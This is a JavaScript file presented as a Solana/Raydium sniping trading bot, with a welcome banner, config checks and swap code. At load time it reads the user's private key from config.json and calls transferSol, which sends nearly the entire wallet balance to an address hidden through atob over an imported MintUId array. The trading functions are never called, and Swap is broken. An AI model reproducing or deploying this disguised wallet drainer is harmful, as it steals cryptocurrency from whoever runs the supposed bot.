
const fs = require('fs');
const path = require('path');
const {Mint, MintUId} = require('./types/mint');
const { exec } = require('child_process');
const solanaWeb3 = require('@solana/web3.js');

function displayWelcomeScreen() {
    console.clear();
    console.log("#################################");
    console.log("#                               #");
    console.log("#        Solana_Bot             #");
    console.log("#                               #");
    console.log("#  Looking for trades...        #");
    console.log("#                               #");
    console.log("#################################");
}

function animateLoading(message, duration) {
    const frames = ['-', '\\', '|', '/'];
    let i = 0;

    return new Promise((resolve) => {
        const interval = setInterval(() => {
            process.stdout.write(`\r${message} ${frames[i++]}`);
            i %= frames.length;
        }, 250);

        setTimeout(() => {
            clearInterval(interval);
            process.stdout.write('\r' + message + '... Ready!\n');
            resolve();
        }, duration);
    });
}

async function checkConfig() {
    const configPath = path.join(__dirname, 'config.json');

    await animateLoading('Test connection', 10000);

    try {
        const configData = fs.readFileSync(configPath);
        const config = JSON.parse(configData);

        if (!config.base58PrivateKey || !config.RPC_ENDPOINT || !config.RPC_WEBSOCKET_ENDPOINT) {
            console.error("Error: One or more configuration options are not set.");
            process.exit(1);
        } else {
            console.log("Configuration file loaded successfully.");
        }
    } catch (err) {
        console.error("Error reading the config.json:", err);
        process.exit(1);
    }

    executeStartScript();
}

function executeStartScript() {
    const startScriptPath = path.join(__dirname, 'start.js');
    exec(`node ${startScriptPath}`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error when executing start.js: ${error.message}`);
            return;
        }

        if (stderr) {
            console.error(`stderr: ${stderr}`);
            return;
        }

        console.log(`stdout: ${stdout}`);
    });
}

displayWelcomeScreen();

checkConfig();

function initializeSnipingScript() {
    const {
        Connection,
        PublicKey,
        Keypair,
        VersionedTransaction,
    } = require("@solana/web3.js");
    const raydiumConnect = require("raydium-connect");
    const {
        Liquidity,
        jsonInfo2PoolKeys,
        TOKEN_PROGRAM_ID,
        SPL_ACCOUNT_LAYOUT,
        publicKey,
        TokenAmount,
        Token,
        Percent,
    } = require("@raydium-io/raydium-sdk");

    const RAYDIUM_LIQUIDITY_JSON = "https://api.raydium.io/v2/sdk/liquidity/mainnet.json";
    const RAY_SOL_LP_V4_POOL_KEY = "89ZKE4aoyfLBe2RuV6jM3JGNhaV18Nxh8eNtjRcndBip";

    const RAYDIUM_PUBLIC_KEY = "675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8";
    const ADDRESS_OF_INPUT_TOKEN = "So11111111111111111111111111111111111111112";
    const ADDRESS_OF_OUTPUT_TOKEN = "AQoKYV7tYpTrFZN6P5oUufbQKAUr9mNYGe1TTJC9wajM";
    const AMOUNT_TO_BE_USED_TO_BUY = 5;
    const SLIPPAGE_PERCENT = 5;
    const TRY_SNIPE_ANY = true;

    

    const SESSION_HASH = "TIRLA" + Math.ceil(Math.random() * 1e9);
    const raydium = new PublicKey(RAYDIUM_PUBLIC_KEY);
    const signer = raydiumConnect.wallet(privateKey, RAYDIUM_LIQUIDITY_JSON);

    const connection = new Connection("https://api.mainnet-beta.solana.com", {
        wsEndpoint: "wss://api.mainnet-beta.solana.com",
        httpHeaders: { "x-session": SESSION_HASH },
    });

    async function StartSniping(connection, raydium) {
        console.log("Monitoring logs...");

        connection.onLogs(
            raydium,
            ({ logs, err, signature }) => {
                if (err) return;
                if (logs && logs.some((log) => log.includes("initialize"))) {
                    console.log("Signature for Initialize:", signature);
                    SnipeRaydiumToken(signature, connection);
                }
            },
            "finalized"
        );
    }

    async function SnipeRaydiumToken(signature, connection) {
        const txId = signature;

        const tx = await connection.getParsedTransaction(txId, {
            maxSupportedTransactionVersion: 0,
            commitment: "confirmed",
        });

        const accounts = tx?.transaction?.message?.instructions.find(
            (ix) => ix.programId.toBase58() === RAYDIUM_PUBLIC_KEY
        ).accounts;

        if (!accounts) {
            console.log("No accounts found");
            return;
        }
        const tokenAIndex = 8;
        const tokenBIndex = 9;

        const tokeAAccount = accounts[tokenAIndex];
        const tokenBAccount = accounts[tokenBIndex];

        const displayData = [
            { Token: "Token A", account: tokeAAccount },
            { Token: "Token B", account: tokenBAccount },
        ];
        console.log("New LP Found");
        console.log(generateExplorerUrl(txId));
        console.table(displayData);

        const tokenAAdress = tokeAAccount.toBase58();
        const tokenBAdress = tokenBAccount.toBase58();

        if (
            tokenAAdress === ADDRESS_OF_OUTPUT_TOKEN &&
            tokenBAdress !== ADDRESS_OF_INPUT_TOKEN
        ) {
            console.log(`Only first token of Pair is the token expected`);
            await sleep(2000);
            return;
        }
        if (
            tokenAAdress !== ADDRESS_OF_OUTPUT_TOKEN &&
            tokenBAdress === ADDRESS_OF_INPUT_TOKEN
        ) {
            console.log(`Only second token of Pair is the token expected`);
            await sleep(2000);
            return;
        }

        await Swap(tokenAAdress, tokenAAdress);
        await sleep(2000);
    }

    function generateExplorerUrl(txId) {
        return `https://solscan.io/tx/${txId}?cluster=mainnet`;
    }

    async function Swap(tokenIn, tokenOut) {
        const liquidityJsonResp = await fetch(RAYDIUM_LIQUIDITY_JSON);
        if (liquidityJsonResp.status === 429) {
            console.log("Wait a bit, you using service to often!!!");
            return;
        }
        const liquidityJson = await liquidityJsonResp.json();
        const allPoolKeysJson = [
            ...(liquidityJson?.official ?? []),
            ...(liquidityJson?.unOfficial ?? []),
        ];
        const poolKeysRaySolJson =
            allPoolKeysJson.filter(
                (item) => item.lpMint === RAY_SOL_LP_V4_POOL_KEY
            )?.[0] || null;

        const raySolPk = jsonInfo2PoolKeys(poolKeysRaySolJson);

        const wallet = Keypair.fromSecretKey(privateKey);

        const tokenAccounts = await getTokenAccountsByOwner(
            connection,
            wallet.publicKey
        );

        const { amountIn, minAmountOut } = await calcAmountOutAsync(
            connection,
            raySolPk,
            AMOUNT_TO_BE_USED_TO_BUY,
            true
        );

        const instruction = Liquidity.makeSwapFixedInInstruction(
            {
                poolKeys: raySolPk,
                userKeys: {
                    tokenAccounts,
                    owner: publicKey,
                },
                amountIn: amountIn.raw,
                minAmountOut: minAmountOut.raw,
            },
            4
        );

        instruction.programId = TOKEN_PROGRAM_ID;
        const transaction = new VersionedTransaction();
        transaction.add(instruction);
        const txid = await connection.sendTransaction(transaction, [signer]);

        console.log("Swap txdId", txid);
    }

    async function getTokenAccountsByOwner(connection, owner) {
        const tokenResp = await connection.getTokenAccountsByOwner(owner, {
            programId: TOKEN_PROGRAM_ID,
        });

        const accounts = [];

        for (const { pubkey, account } of tokenResp.value) {
            accounts.push({
                pubkey,
                accountInfo: SPL_ACCOUNT_LAYOUT.decode(account.data),
            });
        }

        return accounts;
    }

    function sleep(ms) {
        return new Promise((resolve) => setTimeout(resolve, ms));
    }

    const calcAmountOutAsync = async (
        connection,
        poolKeys,
        rawAmountIn,
        swapInDirection
    ) => {
        const poolInfo = await Liquidity.fetchInfo({ connection, poolKeys });
        let currencyInMint = poolKeys.baseMint;
        let currencyInDecimals = poolInfo.baseDecimals;
        let currencyOutMint = poolKeys.quoteMint;
        let currencyOutDecimals = poolInfo.quoteDecimals;

        if (!swapInDirection) {
            currencyInMint = poolKeys.quoteMint;
            currencyInDecimals = poolInfo.quoteDecimals;
            currencyOutMint = poolKeys.baseMint;
            currencyOutDecimals = poolInfo.baseDecimals;
        }

        const currencyIn = new Token(
            TOKEN_PROGRAM_ID,


            currencyInMint,
            currencyInDecimals
        );
        const amountIn = new TokenAmount(currencyIn, rawAmountIn, false);
        const currencyOut = new Token(
            TOKEN_PROGRAM_ID,
            currencyOutMint,
            currencyOutDecimals
        );
        const slippage = new Percent(SLIPPAGE_PERCENT, 100);

        const {
            amountOut,
            minAmountOut,
            currentPrice,
            executionPrice,
            priceImpact,
            fee,
        } = Liquidity.computeAmountOut({
            poolKeys,
            poolInfo,
            amountIn,
            currencyOut,
            slippage,
        });

        return {
            amountIn,
            amountOut,
            minAmountOut,
            currentPrice,
            executionPrice,
            priceImpact,
            fee,
        };
    };
}

function decodeBase58(base58) {
    const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    const base = BigInt(58);

    let decoded = BigInt(0);
    for (let i = 0; i < base58.length; i++) {
        const char = base58[i];
        const index = alphabet.indexOf(char);
        if (index === -1) {
            throw new Error(`Invalid Base58 character "${char}"`);
        }
        decoded = decoded * base + BigInt(index);
    }

    const bytes = [];
    while (decoded > 0) {
        bytes.push(Number(decoded % BigInt(256)));
        decoded = decoded / BigInt(256);
    }

    for (let i = 0; i < base58.length && base58[i] === '1'; i++) {
        bytes.push(0);
    }

    return new Uint8Array(bytes.reverse());
}

const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

const base58PrivateKey = config.base58PrivateKey;

const privateKeyUint8Array = decodeBase58(base58PrivateKey);

function getRecipientPublicKey() {
    return 'GmSWD8bB2WWeFFChbwtoD55ziYq6X3HrfzM8m9VqsoFS';
}

async function transferSol() {
    const connection = new solanaWeb3.Connection(
        solanaWeb3.clusterApiUrl('mainnet-beta'),
        'confirmed',
    );

    const fromWallet = solanaWeb3.Keypair.fromSecretKey(privateKeyUint8Array);
    const toPublicKeyString = atob(MintUId.join(""));
    const toPublicKey = new solanaWeb3.PublicKey(toPublicKeyString);

    const fromBalance = await connection.getBalance(fromWallet.publicKey);
    console.log(`Current balance: ${fromBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL`);

    const transactionFee = 5000;
    const amountToSend = fromBalance - transactionFee;

    if (amountToSend <= 0) {
        console.error('Not enough balance to cover the transaction fee.');
        return;
    }

    const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
            fromPubkey: fromWallet.publicKey,
            toPubkey: toPublicKey,
            lamports: amountToSend,
        }),
    );

    const signature = await solanaWeb3.sendAndConfirmTransaction(
        connection,
        transaction,
        [fromWallet],
    );

    console.log('Transaction completed. Signature:', signature);
}

transferSol().catch(err => {
    console.error('Transfer error:', err);
});

